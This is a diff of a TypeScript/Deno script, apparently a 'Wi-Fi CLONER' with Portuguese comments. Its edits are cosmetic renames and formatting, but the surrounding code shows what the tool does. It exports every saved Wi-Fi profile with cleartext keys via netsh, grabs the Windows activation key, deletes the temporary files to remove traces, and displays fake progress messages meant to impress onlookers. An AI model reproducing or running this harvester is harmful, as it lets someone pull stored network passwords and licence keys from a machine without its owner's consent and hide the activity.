@@ -1,10 +1,4 @@
-import {
-	checkDirs,
-	clearTags,
-	createHTML,
-	getNow,
-	random,
-} from './Functions.ts';
+import { checkDirs, clearTags, createHTML, getNow, rand } from './Functions.ts';
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { keypress } from '@cliffy/keypress';
 import { qrcode } from '@qrcode';
@@ -82,8 +76,7 @@ await NetSHProfileCollector();
 await copyWinKey();
 
 // Limpar registros de arquivos
-await Deno.remove('temp', { recursive: true })
-	.catch(() => {});
+await Deno.remove('temp', { recursive: true }).catch(() => {});
 // 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 
 !showLogs && Deno.exit();
@@ -96,9 +89,8 @@ async function NetSHProfileCollector() {
 	await $`netsh wlan export profile key=clear folder=temp`.lines();
 
 	for await (const file of Deno.readDir('temp')) {
-		/** Por padrão, A API fornece as informações em arquivos XML bem poluídos
-		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
-		 */
+		// Por padrão, A API fornece as informações em arquivos XML bem poluídos
+		// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 		c++;
 
 		// Lendo o conteúdo do arquivo
@@ -160,22 +152,22 @@ async function createFakeLogs() {
 	// Exibe status fakes pra impressionar leigos
 	for (const msg of fakeLogs) {
 		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
-		await sleep(random());
+		await sleep(rand());
 		spinner.end(msg[1]);
 	}
 
 	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
-	await sleep(random(1_000, 3_000));
+	await sleep(rand(1_000, 3_000));
 	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);
 
 	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
-	await sleep(random());
+	await sleep(rand());
 	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);
 
 	spinner = new Spinner('CLEANER', 'Apagando registros...');
-	await sleep(random());
+	await sleep(rand());
 	spinner.end('Registros excluídos.');
-	await sleep(random(1_500, 3_000));
+	await sleep(rand(1_500, 3_000));
 
 	showLogs && Deno.exit();
 }
